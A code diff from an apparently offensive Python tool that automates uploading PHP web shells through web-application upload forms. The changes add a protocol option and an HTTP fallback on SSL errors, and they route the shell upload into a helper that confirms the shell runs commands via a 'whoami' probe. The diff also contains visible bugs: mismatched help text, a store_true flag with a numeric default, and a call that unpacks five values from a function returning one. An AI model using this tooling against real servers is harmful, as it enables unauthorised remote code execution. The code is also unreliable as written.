@@ -52,6 +52,7 @@ parser.add_argument('-v', "--verbose", type=int, dest="global_verbosity", defaul
 parser.add_argument("--timeout", action="store_true", dest="timeout", default=20, help=f"Number of seconds the request will wait before timing out (Default: 20)\nUsage: {blue}--timeout{reset}")
 parser.add_argument("--print-response", action="store_true", dest="print_response", default=False,help=f"If set, HTTP response will be printed on the screen\nUsage: {blue}--print-response{reset}")
 parser.add_argument("--status-code", type=str, dest="status_codes", default="200",help=f"HTTP status codes which will be treated as acceptable, default 200\nUsage: {blue}--status-code 200,301{reset}")
+parser.add_argument("--protocol", type=str, dest="protocol", default="https",help=f"Connection protocol to be used for uploads, default https\nUsage: {blue}--status-code https{reset}")
 
 options = parser.parse_args()
 
@@ -275,7 +276,7 @@ def upload(request_file, session, file_data, file_name, file_content_type, timeo
     content, headers, host, path = parse_request_file(request_file)
     content = content.replace("*filename*", file_name)
 
-    url = f"https://{host}/{path}"
+    url = f"{variations.protocol}://{host}{path}"
 
     try:
         if isinstance(content, list):
@@ -316,8 +317,9 @@ def upload(request_file, session, file_data, file_name, file_content_type, timeo
         except SSLError:
 
             url_http = url.replace('https://', 'http://')  # Change protocol to http
+            variations.protocol = "http"
 
-            warning(f"SSL error occurred. Trying HTTP...")  
+            warning(f"SSL error occurred. Switching to HTTP...")  
             response = session.post(url_http, data=multipart_data, headers=headers, allow_redirects=False, timeout=options.timeout)  # Sending a POST request to the url with the files, headers, and data provided.
             
         if (response.status_code == 404):
@@ -331,18 +333,18 @@ def upload(request_file, session, file_data, file_name, file_content_type, timeo
     else:
         error("Cannot parse request file")
 
-def upload_and_validate(request_file, session, file_data, file_name, mimetype, message, expect_interaction=True, real_extension=None):
+def upload_and_validate(request_file, session, file_data, file_name, mimetype, message=None, expect_interaction=True, real_extension=None):
     global options
 
     content, headers, host, path = parse_request_file(request_file)
     response, session, headers, url, file_name = upload(request_file, session, file_data, file_name, mimetype)
     if (real_extension != None): file_name = (file_name.split(".")[0]) + real_extension
     upload_url = f"http://{host}{options.upload_dir}"
-    if (options.global_verbosity < 2): show_progress_bar()
+    if (options.global_verbosity < 2 and message != None): show_progress_bar()
     if (check_success(response)):
         if expect_interaction: success(message + "\n")
 
-        check_result = check_shell(upload_url + file_name)
+        check_result = check_shell(upload_url + file_name, more_info=True)
         if (check_result == True):
             if not expect_interaction: success(message + "\n")
             success("Shell confirmed interactable")
@@ -355,7 +357,7 @@ def upload_and_validate(request_file, session, file_data, file_name, mimetype, m
                 else:
                     warning("Shell does not seem to be interractable, make sure your upload directory is correct")
 
-    failure(message, 2)
+    if (message != None): failure(message, 2)
     return session
 
 def main():
@@ -371,6 +373,8 @@ def main():
 
     if (options.upload_dir == False):
         warning("Upload location not set, defaulting to '/'")
+
+    variations.protocol = options.protocol
 
     #Test for accepted formats
     info("Testing for accepted file types")
@@ -393,15 +397,7 @@ def main():
             info(f"Trying to upload .{accepted_php_extension} shell...")
             with open("assets/shells/simple.php", 'rb') as file: file_data = file.read()
             file_name = generate_random_string(10) + f".{accepted_php_extension}"
-            response, session, headers, url, file_name = upload(options.request_file, session, file_data, file_name, "application/x-httpd-php")
-            if (check_success(response)):
-                success("Shell successfully uploaded")
-                if (check_shell(upload_url + file_name) == True):
-                    success("Shell confirmed interractable")
-                    exit_success(upload_url + file_name)
-                else:
-                    debug((upload_url + file_name + "?test=whoami"), 1)
-                    warning("Shell does not seem to be interractable, make sure your upload directory is correct")
+            response, session, headers, url, file_name = upload_and_validate(options.request_file, session, file_data, file_name, "application/x-httpd-php")
 
             
 
